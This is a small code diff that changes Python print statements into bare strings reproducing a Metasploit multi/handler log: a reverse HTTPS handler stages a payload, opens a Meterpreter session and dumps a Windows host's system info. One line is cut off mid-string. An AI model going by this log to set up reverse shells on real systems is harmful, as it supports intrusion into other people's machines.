@@ -1,16 +1,16 @@
-print(" msf6 exploit(multi/handler) > exploit")
-print("Started HTTPS reverse handler on https://192.168.0.11:8443")
-print("https://192.168.0.11:8443 handling request from 192.168.0.5; (UUID: fjpmkooe) Without a database connected that payload UUID tracking will not work!")
-print("[*] https://192.168.0.11:8443 handling request from 192.168.0.5; (UUID: fjpmkooe) Staging x86 payload (176732 bytes) ...")
-print("[!] https://192.168.0.11:8443 handling request from 192.168.0.5; (UUID: fjpmkooe) without a database connected that payload UUID tracking will not work!")
-print("[*] Meterpreter session 1 opened (192.168.0.11:8443192.168.0.5:65403) at 2023-04-02 10:01:28 +0530")
+" msf6 exploit(multi/handler) > exploit"
+"Started HTTPS reverse handler on https://192.168.0.11:8443"
+"https://192.168.0.11:8443 handling request from 192.168.0.5; (UUID: fjpmkooe) Without a database connected that payload UUID tracking will not work!"
+"[*] https://192.168.0.11:8443 handling request from 192.168.0.5; (UUID: fjpmkooe) Staging x86 payload (176732 bytes) ..."
+"[!] https://192.168.0.11:8443 handling request from 192.168.0.5; (UUID: fjpmkooe) without a database connected that payload UUID tracking will not wor
+"[*] Meterpreter session 1 opened (192.168.0.11:8443192.168.0.5:65403) at 2023-04-02 10:01:28 +0530"
 
-print("meterpreter > sysinfo")
-print("Computer           : DESKTOP-GDRKAP9")
-print("OS                 : WINDOWS 10 (10.0 Build 19045)")
-print("Architecture       : x64")
-print("System Language    : en_US")
-print("Domain             : WORKGROUP")
-print("Logged On Users    : 2")
-print("Meterpreter        : x86/windows")
-print("meterpreter >")
+"meterpreter > sysinfo"
+"Computer           : DESKTOP-GDRKAP9"
+"OS                 : WINDOWS 10 (10.0 Build 19045)"
+"Architecture       : x64"
+"System Language    : en_US"
+"Domain             : WORKGROUP"
+"Logged On Users    : 2"
+"Meterpreter        : x86/windows"
+"meterpreter >"
